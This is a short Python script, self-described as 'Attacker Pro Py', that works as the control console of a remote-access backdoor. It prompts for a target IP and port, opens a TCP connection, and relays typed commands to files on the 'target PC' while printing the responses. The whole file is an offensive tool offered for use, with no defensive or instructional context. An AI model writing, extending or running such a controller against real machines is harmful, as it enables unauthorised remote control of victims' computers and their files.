import socket
import threading 
import time 
command = ''

def pushWorker(s, c):
    s.send(c.encode())

def printWorker(s):
    print(s.recv(1024).decode())
    



ip = input('Enter target ip ')
port = int(input('Enter target port '))

print ('#' * 20 + '\n' + 'By : Desagin Coder #' + '\n' + '(Attacker Pro Py)' + '\n' +'#' * 20)
with socket.socket() as soc:
    try:
        soc.connect((ip, port))
        print('OK CONNECT IP :' , ip)
        while command != 'X':
            command = input('Move target PC files >> ')
            t = threading.Thread(target=pushWorker, args=(soc, command))
            t.start()
            time.sleep(1)
            t2 = threading.Thread(target=printWorker, args=(soc, ))
            t2.start()
            

    except Exception as err:
        print('user not Here', err)
        print(err, file=open('erro.txt', 'a'))
        pass

print('sesion is end ')